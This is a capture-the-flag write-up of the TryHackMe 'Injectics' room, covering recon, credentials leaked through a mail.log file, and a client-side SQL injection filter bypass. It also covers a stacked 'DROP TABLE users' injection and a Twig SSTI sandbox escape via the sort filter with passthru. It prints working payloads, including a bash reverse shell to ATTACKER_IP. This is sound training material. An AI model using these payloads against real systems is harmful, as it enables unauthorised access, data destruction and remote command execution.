# Injectics — TryHackMe

![](https://img.shields.io/badge/Platform-TryHackMe-darkred?style=for-the-badge&logo=tryhackme&logoColor=white)
![](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![](https://img.shields.io/badge/OS-Linux-informational?style=for-the-badge&logo=linux&logoColor=white)
![](https://img.shields.io/badge/Category-Web%20%7C%20SQLi%20%7C%20SSTI-orange?style=for-the-badge)

<img width="1918" height="966" alt="Screenshot From 2026-03-27 11-36-41" src="https://github.com/user-attachments/assets/b2c2b7ac-87aa-4ecc-8c63-a9bfcee3b62a" />

## Summary

Injectics is a **Medium** TryHackMe room that serves as a masterclass in everything wrong with web application security. An Apache server hosts a PHP/Twig application with an HTML comment pointing to a `mail.log` file containing default credentials and a dangerously informative email. The login form features client-side-only SQL injection filtering (case-sensitive, naturally), which is bypassed with URL-encoded payloads via Burp Suite. A second-order SQL injection in a leaderboard editing form allows `DROP TABLE users`, triggering an automated service that restores default credentials every 60 seconds — granting superadmin access (**Flag 1**). The admin profile update is vulnerable to SSTI via the Twig template engine, where a sandbox bypass through the `sort` filter with `passthru` as a callback achieves full RCE (**Flag 2**).

```
Recon → mail.log Credential Leak → Client-Side Filter Bypass (SQLi)
  → DROP TABLE users → Superadmin Login (Flag 1)
  → Twig SSTI Sandbox Bypass → RCE via sort/passthru (Flag 2)
```

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | ID |
|:------|:-------|:----------|:---|
| Port scanning | [Discovery](https://attack.mitre.org/tactics/TA0007/) | [Network Service Discovery](https://attack.mitre.org/techniques/T1046/) | `T1046` |
| Source code & `mail.log` recon | [Reconnaissance](https://attack.mitre.org/tactics/TA0043/) | [Gather Victim Host Info: Client Configurations](https://attack.mitre.org/techniques/T1592/004/) | `T1592.004` |
| Directory fuzzing | [Reconnaissance](https://attack.mitre.org/tactics/TA0043/) | [Active Scanning: Vulnerability Scanning](https://attack.mitre.org/techniques/T1595/002/) | `T1595.002` |
| Credentials from `mail.log` | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/) | `T1552.001` |
| SQL Injection auth bypass | [Initial Access](https://attack.mitre.org/tactics/TA0001/) | [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) | `T1190` |
| `DROP TABLE` to reset credentials | [Impact](https://attack.mitre.org/tactics/TA0040/) | [Stored Data Manipulation](https://attack.mitre.org/techniques/T1565/001/) | `T1565.001` |
| Superadmin login with default creds | [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/) | [Valid Accounts: Default Accounts](https://attack.mitre.org/techniques/T1078/001/) | `T1078.001` |
| SSTI → RCE via Twig `sort` filter | [Execution](https://attack.mitre.org/tactics/TA0002/) | [Command and Scripting Interpreter: Unix Shell](https://attack.mitre.org/techniques/T1059/004/) | `T1059.004` |

## Reconnaissance — `T1046` `T1592.004`

### Nmap

```bash
nmap -sC -sV -v $IP
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Injectics Leaderboard
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
```

Standard affair — SSH on 22, Apache on 80 serving a PHP application. The missing `httponly` flag on `PHPSESSID` is a nice touch that sets the tone for the security posture of this entire application.

### Web Enumeration

<img width="1920" height="847" alt="Injectics_web_site" src="https://github.com/user-attachments/assets/056344e9-a20d-479d-b884-ee4d81885dec" />


The landing page is an unremarkable leaderboard. Nothing in the UI stands out, but the source code is far more generous than the developers intended:

```html
<!-- Website developed by John Tim - dev@injectics.thm-->
<!-- Mails are stored in mail.log file-->
```

Without even firing up `ffuf`, we already have a developer email and a file path. Navigating to `mail.log` reveals the crown jewels:

```
From: dev@injectics.thm
To: superadmin@injectics.thm
Subject: Update before holidays
```

The email explains that a service called "Injectics" monitors the database and **automatically inserts default credentials** into the `users` table if it is deleted or corrupted. It runs every 60 seconds. The default credentials are helpfully listed in the email:

| Email | Password |
|:------|:---------|
| `superadmin@injectics.thm` | `superSecurePasswd101` |
| `dev@injectics.thm` | `devPasswd123` |

<img width="1919" height="845" alt="Injectics_web_login" src="https://github.com/user-attachments/assets/4b9e3c88-acc7-48ac-a55c-b539dea11cbc" />


These credentials don't work on the login form — they've clearly been changed since the email was written. But the self-healing database mechanism is the real prize. If we can `DROP TABLE users`, the service will restore the defaults within 60 seconds. A remarkably cooperative vulnerability.

### Directory Fuzzing — `T1595.002`

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
     -u http://$IP/FUZZ -ic -c -e .php,.txt,.html,.log,.xml,.md
```

<img width="857" height="372" alt="Injectics_fuzzing" src="https://github.com/user-attachments/assets/31a8ace4-3960-49ec-b34b-73f73a10002a" />


Notable findings: `functions.php` (the login endpoint), `dashboard.php` (admin panel), a `flags/` directory, and `phpmyadmin` (version is not vulnerable — checked).

## Exploitation — `T1190` `T1552.001`

### SQL Injection — Client-Side Filter Bypass

The login form has SQL injection protection. Let's see how robust it is:

<img width="431" height="137" alt="Injectics_login_windows" src="https://github.com/user-attachments/assets/bf02b965-ef75-4195-a9c0-6c86d54841a2" />


Entering a single quote triggers a warning popup. Examining the source reveals the culprit — a JavaScript filter in `script.js`:

```javascript
const invalidKeywords = ['or', 'and', 'union', 'select', '"', "'"];
for (let keyword of invalidKeywords) {
    if (username.includes(keyword)) {
        alert('Invalid keywords detected');
        return false;
    }
}
```

Client-side validation. Case-sensitive. Checking exact lowercase matches. No server-side counterpart.

This is the web security equivalent of locking your front door and leaving all the windows open. Writing `OR` instead of `or` bypasses the filter entirely. But more importantly, the check runs in JavaScript before the AJAX request — meaning **Burp Suite bypasses it completely** by intercepting the request after the browser.

#### Burp Suite Intruder

Armed with SQL authentication bypass payloads from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/), I loaded the wordlist into Burp Intruder and targeted the `username` field.

<img width="1919" height="930" alt="Injectics_Burp_Intruder" src="https://github.com/user-attachments/assets/ed4d2854-5074-4b46-9991-97081e1e5d5b" />

<img width="1919" height="933" alt="Injectics_Burp_Intruder_sucsess" src="https://github.com/user-attachments/assets/cb425418-5340-4ec6-80b0-789e61831cf2" />

One payload triggers a successful login:

```sql
' OR 'x'='x'#;
```

URL-encoded as: `%27%20%4f%52%20%27%78%27%3d%27%78%27%23%3b`

The response confirms access:

```json
{
  "status": "success",
  "message": "Login successful",
  "is_admin": "true",
  "first_name": "dev",
  "redirect_link": "dashboard.php?isadmin=false"
}
```

> **Note:** The `?isadmin=false` parameter in the redirect is a red herring — changing it to `true` does nothing. Authorization is handled server-side (apparently they did get *one* thing right).

<img width="1919" height="870" alt="Injectics_dashboard" src="https://github.com/user-attachments/assets/78d26862-26bb-4d6d-939e-8894099ddf9f" />

We're in the dashboard as `dev`, but we need superadmin access.

### Second-Order SQLi — DROP TABLE users — `T1565.001`

The dashboard allows editing leaderboard entries. The browser interface filters special characters, but Burp Suite speaks directly to the server.

Intercepting the `POST /edit_leaderboard.php` request reveals a `rank` field that isn't editable in the UI — a classic overlooked input.

<img width="1919" height="926" alt="Injectics_Burp_Repeater" src="https://github.com/user-attachments/assets/aedff329-2370-44c9-8f25-aeb217546b75" />

A single quote in the `rank` field returns status 200 but fails to save — consistent with blind SQL injection behavior. Time to weaponize the self-healing database mechanism from the email:

```
rank=1; DROP TABLE users; -- -&country=USA&gold=1&silver=1&bronze=1
```

The site immediately throws a database error. After waiting 60 seconds for the Injectics service to restore the `users` table with default credentials, we log in as superadmin.

### Flag 1 — Superadmin Dashboard — `T1078.001`

<img width="1919" height="880" alt="Injectics_dashboard_flag" src="https://github.com/user-attachments/assets/73ce705a-ac9c-45dd-91b7-0ab48e253c56" />

Logging in with `superadmin@injectics.thm` / `superSecurePasswd101` grants access to the admin panel — and **Flag 1**.

## Server-Side Template Injection — `T1059.004`

### Identifying Twig

Additional fuzzing of the `vendor/` directory reveals `bin/`, `composer/`, and — crucially — `twig/`. The presence of the Twig template engine immediately suggests SSTI as the next vector.

### Confirming SSTI

The superadmin panel exposes a new "Profile" section. Testing with the classic SSTI probe:

```twig
{{5*5}}
```
<img width="1028" height="561" alt="Injectics_profile_update" src="https://github.com/user-attachments/assets/08258431-bb45-452b-a070-b8320e9c7bc5" />

<img width="1599" height="772" alt="Injectics_SSTI_confirm" src="https://github.com/user-attachments/assets/13c2eebf-58e6-4035-9ed5-dad1eaf025bf" />

The output renders `25` — SSTI confirmed. However, the Twig sandbox is active and heavily restricted.

### Sandbox Bypass via `sort` Filter

Standard SSTI payloads using `map` and `filter` fail with sandbox errors. The sandbox blocks most Twig filters that accept callbacks — the very filters that could execute arbitrary PHP functions.

In Twig, four filters accept callable arguments and are commonly abused for SSTI:

- `map` — blocked
- `filter` — blocked
- `sort` — **allowed**
- `reduce` — blocked

Testing the `sort` filter with PHP's `system` function:

```twig
{{['id','']|sort('system')}}
```

<img width="746" height="262" alt="Injectics_array" src="https://github.com/user-attachments/assets/db43ccc1-fa64-4eb2-a5b8-0dfdcd6f2305" />

The output shows `Array` — meaning the expression executed successfully and returned data, but PHP can't render an array as a string. The command ran, but `system()` writes to stdout before Twig captures the return value.

Switching to `passthru` — which outputs directly to the browser rather than returning a value — solves the problem:

```twig
{{['id','']|sort('passthru')}}
```

<img width="1087" height="226" alt="Injectics_id_command_rce" src="https://github.com/user-attachments/assets/b2b691cc-6251-46f6-a00c-55154f52c798" />

Full RCE achieved. The output shows the web server user's identity.

### Flag 2 — Reverse Shell or Direct Read

At this point we can either read the flag directly through the profile field or throw a reverse shell for full interactive access:

```twig
{{["bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'",""]|sort('passthru')}}
```

> **Note:** The `bash -c` wrapper is required — without it, the shell redirect operators aren't interpreted correctly by `sort`'s invocation of `passthru`.

<img width="1919" height="966" alt="Injectics_Flag2" src="https://github.com/user-attachments/assets/057fb63a-26f5-4449-82bb-d3ecd6de985b" />

**Flag 2** captured.

## Lessons Learned

1. **Client-side validation is not security — it's a suggestion.** The JavaScript filter checked for lowercase SQL keywords and could be bypassed by capitalization, URL encoding, or simply intercepting the request with Burp Suite. Server-side validation is the only validation that counts.

2. **Self-healing services can be weaponized.** The Injectics service was designed as a safety net — automatically restoring default credentials if the database was corrupted. Combined with SQL injection, this "feature" became the primary attack vector. Automated recovery mechanisms should never restore known credentials.

3. **Blind SQL injection in unexpected fields is easily overlooked.** The `rank` field wasn't editable in the browser UI, making it invisible to casual testing. Always test every parameter in the actual HTTP request, not just the ones visible in the frontend.

4. **Twig sandbox bypasses follow a predictable pattern.** When `map` and `filter` are blocked, always test `sort` and `reduce`. These four filters are the canonical SSTI escape vectors in Twig because they accept callable arguments — and sandbox policies rarely block all four.

5. **`passthru` vs `system` matters in template injection.** PHP's `system()` returns output as a string (which Twig can't render from an array context), while `passthru()` writes directly to the output buffer. When SSTI returns `Array` instead of command output, switching the callback function is the fix.

---

*Writeup by [@alfabuster](https://github.com/alfabuster)*
